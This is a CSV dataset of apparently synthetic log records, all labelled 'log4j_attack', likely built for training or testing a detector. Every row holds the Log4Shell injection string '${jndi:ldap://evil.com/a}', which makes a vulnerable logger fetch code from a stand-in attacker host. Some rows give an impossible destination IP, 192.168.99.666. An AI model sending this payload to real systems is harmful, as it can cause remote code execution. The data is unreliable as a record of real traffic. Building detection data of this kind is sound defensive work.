timestamp,src_ip,dst_ip,process_name,file_hash,signature_status,outbound_conn_5min,dns_query,log_line,jndi_present,entropy,label
2025-11-28T06:19:56.032039,192.168.1.219,185.199.108.33,java.exe,31d6c52d91f6ffb561d5f6920eb62810e0b419c785e42b82517d25baa87d9867,Valid,45,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.359,log4j_attack
2025-11-28T06:19:56.032054,192.168.1.17,185.45.67.88,java.exe,2ecbc4d91d1e599e892cdd97ead40decc15eae9d42abd41ac3db7088f2d3fb32,Valid,38,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.322,log4j_attack
2025-11-28T06:19:56.032070,192.168.1.127,45.32.123.99,java.exe,2859e47e08feb86ea5b388ff2128cdbb3cc310a43592ae492710e89ac889ae78,Valid,49,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.403,log4j_attack
2025-11-28T06:19:56.032085,192.168.1.154,185.199.108.33,java.exe,354614b682790bc68de4ba09f6553fbce42cb45f04659b1e7a4c08e7ee4bbc9c,Valid,52,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.019,log4j_attack
2025-11-28T06:19:56.032100,192.168.1.185,45.32.123.99,java.exe,da9ee34728b416f28cdaa2f172b834bea487fd3d5200ce4456656840c232925b,Valid,49,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.957,log4j_attack
2025-11-28T06:19:56.032115,192.168.1.31,185.45.67.88,java.exe,9c6b440cf65119fd002eae47120e030f7e5eed7062cda98bcd1ae38ce5389af2,Valid,28,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.914,log4j_attack
2025-11-28T06:19:56.032131,192.168.1.126,192.168.99.666,java.exe,ed0b774ab4171ace0280761027e5fa8f7583d4eddfa0b374ff45a4fe042cdfa3,Valid,60,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.989,log4j_attack
2025-11-28T06:19:56.032146,192.168.1.227,185.199.108.33,java.exe,593e8c4a59fb058998018fc3cb19fee35c2c3ceedb1e865170811375d46a4abf,Valid,37,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.026,log4j_attack
2025-11-28T06:19:56.032161,192.168.1.214,185.45.67.88,java.exe,b57e261e4ffeeeb0c04bbe3fd954c90cb992b0bf810ec2e87a9ec307273bfe4b,Valid,45,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.467,log4j_attack
2025-11-28T06:19:56.032176,192.168.1.213,185.45.67.88,java.exe,a4a9283dbfa5ccc3d174e084de3a111fa903ad73ca918359d164c1d6714050e6,Valid,74,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.913,log4j_attack
2025-11-28T06:19:56.032191,192.168.1.16,192.168.99.666,java.exe,71387b039c214de79a68ed1bbf0b92bcf42c7d35b39dafa034f735f5f546a07c,Valid,40,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.956,log4j_attack
2025-11-28T06:19:56.032206,192.168.1.90,185.199.108.33,java.exe,335e34a363df2a084e56727ab6f322ab15ec906449c1d1dabcf3f15c5ab22f66,Valid,22,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.471,log4j_attack
2025-11-28T06:19:56.032221,192.168.1.156,45.32.123.99,java.exe,879e78a86854a69d677958c857ccf7d6f45cda95d82f2ebd68f3b225a9835e1f,Valid,40,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.232,log4j_attack
2025-11-28T06:19:56.032236,192.168.1.30,104.21.45.67,java.exe,282b297e63dadc1bd71118fd227d471ca1410be4e3ded74a28864130aa161d59,Valid,57,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.324,log4j_attack
2025-11-28T06:19:56.032251,192.168.1.33,192.168.99.666,java.exe,285b1524e73357d181a14db085bad361e4e36a9b436b9cfdef666d6b04ff0b47,Valid,62,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.001,log4j_attack
2025-11-28T06:19:56.032266,192.168.1.73,104.21.45.67,java.exe,e6aac2555c7563f79dc5d637c16f9446f49f98c8f1dfc1f7e3a4c4b729219286,Valid,42,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.426,log4j_attack
2025-11-28T06:19:56.032281,192.168.1.107,45.32.123.99,java.exe,2b905d9d5f0e3cdad52a76d156884deaad151bedbfaae96f9591a0dcfbb18a18,Valid,21,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.191,log4j_attack
2025-11-28T06:19:56.032296,192.168.1.185,185.199.108.33,java.exe,d572d652ff025e28158120cc69ec214b5983a932181ee6e803dcc6b3c387023c,Valid,24,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.108,log4j_attack
2025-11-28T06:19:56.032311,192.168.1.90,185.199.108.33,java.exe,8313da740a396313d176d8c4cf5c8ee646b761c570a62626bdafabe62956fa4a,Valid,72,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.981,log4j_attack
2025-11-28T06:19:56.032326,192.168.1.190,192.168.99.666,java.exe,df98446946be47a6146c9bf96f121e262e021f719fd4db7047eacd29d07b8923,Valid,69,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.049,log4j_attack
2025-11-28T06:19:56.032347,192.168.1.157,192.168.99.666,java.exe,30bb45966c6d67e6e880718242f5606fe8fadb5fa2c677aad2567a5cc6b2c147,Valid,60,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.028,log4j_attack
2025-11-28T06:19:56.032362,192.168.1.173,104.21.45.67,java.exe,936c282cf33d04341ac1b0c527de8aa3f09942ea8e42fce8af60d005dafeeab2,Valid,66,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.289,log4j_attack
2025-11-28T06:19:56.032377,192.168.1.47,185.199.108.33,java.exe,2115ba4180819ef7e5ff6c5b0f1c81eda96b26ebb3de21006d94ca351fc85ea3,Valid,40,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.004,log4j_attack
2025-11-28T06:19:56.032393,192.168.1.27,185.45.67.88,java.exe,f98e89f6ffaef0fea5aeb2401f229629759c42a9ae48b8680a712cbdeda4ea08,Valid,78,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.95,log4j_attack
2025-11-28T06:19:56.032407,192.168.1.159,104.21.45.67,java.exe,759feac732b7e57feafc1b6ba44ac5aafd042fa6f6abdb7d84527365f604d335,Valid,50,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.234,log4j_attack
2025-11-28T06:19:56.032423,192.168.1.14,192.168.99.666,java.exe,ba39c1cfa6458585ee644ea1f6b14a9a8f532bac588c7ce24adef83751c267a4,Valid,48,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.232,log4j_attack
2025-11-28T06:19:56.032438,192.168.1.63,192.168.99.666,java.exe,0b7ae2fd5f296b2503a6491b3fa4ed5e8c3e5bb63edda09e61646ad1b9393ed2,Valid,47,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.295,log4j_attack
2025-11-28T06:19:56.032453,192.168.1.136,185.199.108.33,java.exe,d4cafb1f36f52ee33d976a409eee991d0d469de2b4cac589948f2608c0878217,Valid,80,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.845,log4j_attack
2025-11-28T06:19:56.032469,192.168.1.70,104.21.45.67,java.exe,68f7b6362f9b2ed2376f43860c451002fd52079c63052269f7bfbee1c874dd1f,Valid,53,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.997,log4j_attack
2025-11-28T06:19:56.032484,192.168.1.189,185.199.108.33,java.exe,54d40043971d8509bd50ea5095ee7dc8f4e48657f1c546696e4dff2746d234ee,Valid,28,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.247,log4j_attack
2025-11-28T06:19:56.032499,192.168.1.34,45.32.123.99,java.exe,1eedc2bbfca6a1811ab49da129957dc5d6d6fae6d7de6428b809ab8301fc753f,Valid,58,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.246,log4j_attack
2025-11-28T06:19:56.032514,192.168.1.133,104.21.45.67,java.exe,7d4636c4c1752bf7b2282e886612b435f0eeb33552be917ecf57e6d6787bfd99,Valid,44,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.019,log4j_attack
2025-11-28T06:19:56.032529,192.168.1.214,104.21.45.67,java.exe,880e2a9668866caddab78929719f8e90d51e95c8fc3780773539fd9729875d3b,Valid,60,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.826,log4j_attack
2025-11-28T06:19:56.032544,192.168.1.18,104.21.45.67,java.exe,7a9e461e14596c0e8c03c28b6740fb712a842a659cc425f5410f13fd21504360,Valid,54,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.344,log4j_attack
2025-11-28T06:19:56.032559,192.168.1.46,185.45.67.88,java.exe,4a5bb6e117cdec53f9c248622f453d88acad74695319583e1c3bcbb396c869ac,Valid,50,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.333,log4j_attack
2025-11-28T06:19:56.032574,192.168.1.55,185.199.108.33,java.exe,6d2a2bfc5ed3934efd89791608df5425238a00174e6d65cffe97b538b41fde5e,Valid,42,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.851,log4j_attack
2025-11-28T06:19:56.032589,192.168.1.174,192.168.99.666,java.exe,77d2649077a86f0bd139c137ce48b55a414ce707b290debb3b4e8a20e920215f,Valid,59,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.408,log4j_attack
2025-11-28T06:19:56.032605,192.168.1.88,104.21.45.67,java.exe,37c4083ab162bacdcd8e06bbcb702a487a7e639a928180883eccb6d087312913,Valid,61,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.086,log4j_attack
2025-11-28T06:19:56.032620,192.168.1.34,45.32.123.99,java.exe,0cdd6949b4b0ba3a9bb80e4af725e39ff6d12e844e1c31e90e6a11947d6b1b1a,Valid,70,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.881,log4j_attack
2025-11-28T06:19:56.032635,192.168.1.202,192.168.99.666,java.exe,1d58a5dbaadee54b4ca5dff8c3c892497cd281d76f0ef075752a6bbb65a580f5,Valid,72,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.155,log4j_attack
2025-11-28T06:19:56.032650,192.168.1.205,45.32.123.99,java.exe,9fb6a1df09eeb090ae15bbdef17f23a530a3648bf0aca3eeab36d12d4af042b6,Valid,72,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.852,log4j_attack
2025-11-28T06:19:56.032665,192.168.1.27,185.199.108.33,java.exe,011edf0d56df91878d2fe3e74651b26a72159efaf1c4c6201a95e7ef6677f272,Valid,69,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.257,log4j_attack
2025-11-28T06:19:56.032680,192.168.1.11,192.168.99.666,java.exe,3938f5269fc18b2e2ade9b58fb7a8b94cffe9f5e436f8d9ebbf9a704ad4cd0d0,Valid,66,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.814,log4j_attack
2025-11-28T06:19:56.032695,192.168.1.192,192.168.99.666,java.exe,0f823b88c208cbafd93b40dcea27da02d7b8957653c84718021bea6bd420abe9,Valid,54,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.351,log4j_attack
2025-11-28T06:19:56.032710,192.168.1.115,185.199.108.33,java.exe,e8b2e8a7bebee9e5504a45fe94afe5171fd269898943086e0a2774d093dd6a94,Valid,53,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.053,log4j_attack
2025-11-28T06:19:56.032725,192.168.1.65,192.168.99.666,java.exe,6f115a2a9c58428b79e12c7734d1c0d9d2f7c4fab6d14e5f641f720161574d1e,Valid,79,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.228,log4j_attack
2025-11-28T06:19:56.032740,192.168.1.81,185.45.67.88,java.exe,850875c6879050ed5b4433e89804d301bca5c5551ae9add51776651a336dfe56,Valid,31,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.422,log4j_attack
2025-11-28T06:19:56.032755,192.168.1.114,192.168.99.666,java.exe,5f0942c6ce810ea49fc9c32fa362eaf53605640cd79e11b5d1b0f82f613fecc3,Valid,39,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.064,log4j_attack
2025-11-28T06:19:56.032770,192.168.1.138,185.199.108.33,java.exe,a131df2245c1e35b2824d60678b3d0f593c9a718fc24f37b29b49a4229720784,Valid,75,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.369,log4j_attack
2025-11-28T06:19:56.032785,192.168.1.213,192.168.99.666,java.exe,5ef8f1879e3629e0d72d652b86f9f27e4863b4f8178ce682169de0e22baab8cd,Valid,48,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.051,log4j_attack
2025-11-28T06:19:56.032800,192.168.1.73,45.32.123.99,java.exe,ebeb923393ce0376972a5bd5e0ec84b4485ce1e9c23a3d82690c1dc131622c3d,Valid,20,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.305,log4j_attack
2025-11-28T06:19:56.032816,192.168.1.123,45.32.123.99,java.exe,220d8d0fc75e71ff1b2249925e5997739f118bed8b5389247565652316c187fd,Valid,33,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.199,log4j_attack
2025-11-28T06:19:56.032831,192.168.1.250,185.199.108.33,java.exe,cb3510cd9ba224d800410e850110904c5c4b3295eb70d6334fcdc1be25fcdbb7,Valid,23,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.901,log4j_attack
2025-11-28T06:19:56.032846,192.168.1.137,192.168.99.666,java.exe,962f9c281e54581735eb05f1a6eebb52148101e65859a16c328f9f8bda84aa14,Valid,32,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.239,log4j_attack
2025-11-28T06:19:56.032861,192.168.1.230,185.45.67.88,java.exe,e6b10ce1079622d1c9e4f215172e3eae63cdb598dbc7d04eb5af44fd385e31b2,Valid,49,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.991,log4j_attack
2025-11-28T06:19:56.032877,192.168.1.236,185.199.108.33,java.exe,335906a603aee4791a5af2bd0572e834df3fa61954b9d016ba4dd684dd4f7aa1,Valid,74,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.345,log4j_attack
2025-11-28T06:19:56.032905,192.168.1.95,185.199.108.33,java.exe,487177abcb5bfd89494f96fce6c7331315faba4c6e6bfaa5ed47c8ed1a56f1c5,Valid,55,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.382,log4j_attack
2025-11-28T06:19:56.032921,192.168.1.69,45.32.123.99,java.exe,3c7dbdaf523fa9a8437a093afe1d95871c7150c2b2c72ea695b9f2d97b5a61cd,Valid,65,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.104,log4j_attack
2025-11-28T06:19:56.032936,192.168.1.75,192.168.99.666,java.exe,1fe4c1a3a999144cb8eb4a2049f872321f37cba431a6273101d8d3874313e4c8,Valid,28,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.864,log4j_attack
2025-11-28T06:19:56.032952,192.168.1.30,192.168.99.666,java.exe,b4296410892bf23129131fc97080087d0b611a5521aae2b570f2ac6d827e06d5,Valid,48,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.297,log4j_attack
2025-11-28T06:19:56.032967,192.168.1.163,192.168.99.666,java.exe,a960944cfbe5fa6071c6b3848e4bc997d0e5ff89bf6caebd2d7c334b3e54646b,Valid,67,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.337,log4j_attack
2025-11-28T06:19:56.032983,192.168.1.98,104.21.45.67,java.exe,8247743989a38827457b871e144d87cb2d55f023409c83c67d034bae4eb05741,Valid,41,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.301,log4j_attack
2025-11-28T06:19:56.032999,192.168.1.101,185.45.67.88,java.exe,4170ea8f052280f9d7d8c207e8a7f9b57bcf7472cfa7465bf1968b22c9c5f802,Valid,64,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.451,log4j_attack
2025-11-28T06:19:56.033014,192.168.1.93,185.45.67.88,java.exe,eb52345e20f4d26bb3a6906e38865b34afdcf26e63fa11935ae77205bcba9a41,Valid,25,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.216,log4j_attack
2025-11-28T06:19:56.033030,192.168.1.224,185.45.67.88,java.exe,55f40e624c974232c6a925af580ba6786c4b78bb18c3a0259e46786329bc975b,Valid,48,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.375,log4j_attack
2025-11-28T06:19:56.033045,192.168.1.228,185.199.108.33,java.exe,ff13ed6b1e8921951951ffe27c7ec72fb2560401f99e478f5cc6bdf9636bc3e9,Valid,40,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.182,log4j_attack
2025-11-28T06:19:56.033061,192.168.1.184,104.21.45.67,java.exe,936a50d6b3787e702af506c90c8606d6753d5f85026d941356181caf80d3f470,Valid,23,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.402,log4j_attack
2025-11-28T06:19:56.033077,192.168.1.53,185.45.67.88,java.exe,00d7fb9295f5234dd5e4addd2e61fcaf2c7e12f9b85bc4a9f4027204dc32cbcb,Valid,69,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.163,log4j_attack
2025-11-28T06:19:56.033092,192.168.1.141,104.21.45.67,java.exe,490e0fe6092e6a35b45b5d79a0cc980a33364fef696e6c9a4219d5fbbd976c2a,Valid,31,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.351,log4j_attack
2025-11-28T06:19:56.033108,192.168.1.209,45.32.123.99,java.exe,ea3d4ed54017b334b5af6da4a7c2677871f30e41cb39edb34f346cc28736a401,Valid,31,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.199,log4j_attack
2025-11-28T06:19:56.033123,192.168.1.186,185.45.67.88,java.exe,cb4f12deb1a1950b6569d650057df13214f7956367289322629480d69bc157a0,Valid,24,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.446,log4j_attack
2025-11-28T06:19:56.033139,192.168.1.74,192.168.99.666,java.exe,16c5616cc08bf42a73917ed8337bbc257be40da962cedb9eb178e426d5b7451e,Valid,70,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.456,log4j_attack
2025-11-28T06:19:56.033154,192.168.1.46,185.45.67.88,java.exe,61ac1f029356c6208300b7fdae4d28bbda7f19fad4e92c1cf08a5507e6ae4730,Valid,80,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.872,log4j_attack
2025-11-28T06:19:56.033169,192.168.1.18,185.199.108.33,java.exe,1866c26759225a14d0ff76d386445a3d2204664535250c7d962b040062d4bce8,Valid,62,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.278,log4j_attack
2025-11-28T06:19:56.033185,192.168.1.208,192.168.99.666,java.exe,2c4d9be16b1f2426e963c5e1829ba10c97dbc03847916cc73cf1fed277d390d3,Valid,21,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.821,log4j_attack
2025-11-28T06:19:56.033200,192.168.1.26,185.199.108.33,java.exe,e546f97074f4d51b81cb48c39a297b551244bcd95a205778d15dfdb1b0e979df,Valid,44,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.032,log4j_attack
2025-11-28T06:19:56.033216,192.168.1.76,45.32.123.99,java.exe,bf457b6e5691d2a5ff2fa6504ded9356e3080d20f1d5346e6e713b1cfa413c9a,Valid,44,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.936,log4j_attack
2025-11-28T06:19:56.033231,192.168.1.250,45.32.123.99,java.exe,ba5bfe97e0a43cf57d0764c00956933956a3107723aa27a475792b1296d02994,Valid,53,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.069,log4j_attack
2025-11-28T06:19:56.033246,192.168.1.137,192.168.99.666,java.exe,416b621f9c0b60139351bcbc62bc5281f85e39d3b0af3085f3eba7baae5b7761,Valid,25,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.156,log4j_attack
2025-11-28T06:19:56.033261,192.168.1.62,185.45.67.88,java.exe,0574b2eb959380186ac00be48205b56d2223748bd7872bbb597f44076ad80f5a,Valid,66,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.332,log4j_attack
2025-11-28T06:19:56.033277,192.168.1.185,45.32.123.99,java.exe,5a05272388107805c214647f43593a40dc3f610d24eb303233aa1d59d25978ab,Valid,74,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.095,log4j_attack
2025-11-28T06:19:56.033293,192.168.1.82,192.168.99.666,java.exe,ef0a1eaa3aaa1374d01934307e7ebdfb566c52eb2edc29e7a4331f989e3064bf,Valid,24,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.007,log4j_attack
2025-11-28T06:19:56.033308,192.168.1.173,192.168.99.666,java.exe,dbc9acfd2b6a8496f7f6567820f52cfa696972113dc11f7c34f22b5e7bc596f7,Valid,69,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.872,log4j_attack
2025-11-28T06:19:56.033324,192.168.1.58,192.168.99.666,java.exe,9bcb8ad00237a733675238966346eb2fbd80013059189d2ced355259cf95055b,Valid,26,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.924,log4j_attack
2025-11-28T06:19:56.033345,192.168.1.223,185.199.108.33,java.exe,206fbfe35e6a18bd1958dd068bc2c2831f75dff07db689ac35d72eb2bda9c4a5,Valid,28,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.346,log4j_attack
2025-11-28T06:19:56.033361,192.168.1.107,185.199.108.33,java.exe,bdbe4f80b885f90d4c4033be371431d35dc2845c632079333a24a9b6d142dea2,Valid,73,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.041,log4j_attack
2025-11-28T06:19:56.033376,192.168.1.234,185.45.67.88,java.exe,7d120702af458b87da64082385cd550678741d0def178d51a30b5612b1ab8e73,Valid,34,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.011,log4j_attack
2025-11-28T06:19:56.033391,192.168.1.73,185.45.67.88,java.exe,1c7959fd35debdb15f5b368572104bfc917fd58b94d397c59ed2866478b4a56d,Valid,76,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.258,log4j_attack
2025-11-28T06:19:56.033407,192.168.1.213,185.199.108.33,java.exe,57bd12b79b2efb2e62189698360fdf493be1d67b9bfaf8d2857582b10a2c607f,Valid,29,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.913,log4j_attack
2025-11-28T06:19:56.033423,192.168.1.16,185.199.108.33,java.exe,fa4d25d8e052ae2d30c00b20e70bf05d71dda1868b733e2548266b038f321652,Valid,51,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.482,log4j_attack
2025-11-28T06:19:56.033438,192.168.1.107,192.168.99.666,java.exe,10e37e4f1be70e75e4799a13461859bbd851ad9ed93ba8b43a2591ed086236c8,Valid,72,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.113,log4j_attack
2025-11-28T06:19:56.033453,192.168.1.177,185.45.67.88,java.exe,65d3d0b3961f7b573ef3ce7d9788c64d4106489b86c3a66c1b5652396dbfa9f5,Valid,20,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.861,log4j_attack
2025-11-28T06:19:56.033468,192.168.1.23,45.32.123.99,java.exe,5ed0b2384d4703bdb99744c8c5bcc9d103d258ab94e71ce13b025a73b61c1cae,Valid,74,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.001,log4j_attack
2025-11-28T06:19:56.033483,192.168.1.41,45.32.123.99,java.exe,ce9f0888a1177352ffc793a3d6e6270870c038cd9fb00f0bc1e0fd23868a476f,Valid,47,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.281,log4j_attack
2025-11-28T06:19:56.033499,192.168.1.128,185.45.67.88,java.exe,c70cf1d37b2b13fa6003522d6aff28c6b06bca289282b88e3c1362a6917cbe1a,Valid,40,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.972,log4j_attack
2025-11-28T06:19:56.033515,192.168.1.25,192.168.99.666,java.exe,29c49e7c132c37853538c8f3b838c6e5ef94753994a926eecc4adfbfef2f0989,Valid,68,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.853,log4j_attack
2025-11-28T06:19:56.033530,192.168.1.61,192.168.99.666,java.exe,dd3e195ad52d344b822e72a8d5e476fa3eb75263dcfe8164eea384208625ab0c,Valid,59,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.254,log4j_attack
2025-11-28T06:19:56.033546,192.168.1.32,192.168.99.666,java.exe,f90943b5bded427c4e5e52733d15002c2c8fc727099be3a2d332af4768ef8316,Valid,64,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.816,log4j_attack
2025-11-28T06:19:56.033562,192.168.1.192,185.199.108.33,java.exe,8e198f08d3bc11d8f0c617af8494758ec59e70f01130c1e2a6a7260d61c59c2e,Valid,37,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.328,log4j_attack
2025-11-28T06:19:56.033578,192.168.1.55,45.32.123.99,java.exe,f42aa17e92d8c09a8eff39342a1f1cc7261713b64439840c487ed09dfac19f32,Valid,76,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.416,log4j_attack
2025-11-28T06:19:56.033594,192.168.1.164,45.32.123.99,java.exe,a7faca9cfd8c65d3f69f6e91318fa9e2b207dab29c0097a58976f94cf16eb6a2,Valid,64,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.069,log4j_attack
2025-11-28T06:19:56.033610,192.168.1.204,192.168.99.666,java.exe,eedf46376f4d859e27b960552f172c0e389370d1204b42e74639c87d65905cbc,Valid,36,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.157,log4j_attack
2025-11-28T06:19:56.033625,192.168.1.11,104.21.45.67,java.exe,7fb649fdcfafe888d1d8c1c2e67fc5c242046ad5e5ae6766af9395e86c8928d0,Valid,35,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.084,log4j_attack
2025-11-28T06:19:56.033640,192.168.1.155,185.45.67.88,java.exe,7c2eeb973a877a0b8d36bcbf5cf2e7a31bdcfae2f30d3590225a7b438c97ca1a,Valid,67,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.958,log4j_attack
2025-11-28T06:19:56.033656,192.168.1.88,45.32.123.99,java.exe,a5dbc43be99e92f888e5fd0623b6fa4daf50337a38920b695c6f636507e4ca58,Valid,32,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.11,log4j_attack
2025-11-28T06:19:56.033671,192.168.1.138,185.199.108.33,java.exe,3cbce0c13cc00d3e703094197b076859441e1a4f8c9b6df710c5ec0949f4d164,Valid,73,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.389,log4j_attack
2025-11-28T06:19:56.033686,192.168.1.248,104.21.45.67,java.exe,bbd01101ebd7950a1a49051dc0d04326edfde7ac1e90884466688d53f808aff2,Valid,37,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.319,log4j_attack
2025-11-28T06:19:56.033701,192.168.1.74,45.32.123.99,java.exe,e9e9eba2bf9703810e0f3ecc88717db4c4f2b52734beecbf401d15428eee288a,Valid,40,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.416,log4j_attack
2025-11-28T06:19:56.033717,192.168.1.248,185.199.108.33,java.exe,a20099f33a59e4421267bac4ef2c7a5ce6e3d8cf643bdbd7d10ef9c551075a47,Valid,44,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.189,log4j_attack
2025-11-28T06:19:56.033732,192.168.1.209,45.32.123.99,java.exe,ec4c330e06010afb21540761aa3aafcb954c44b8ecea2a0238cb4103776c2280,Valid,42,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.226,log4j_attack
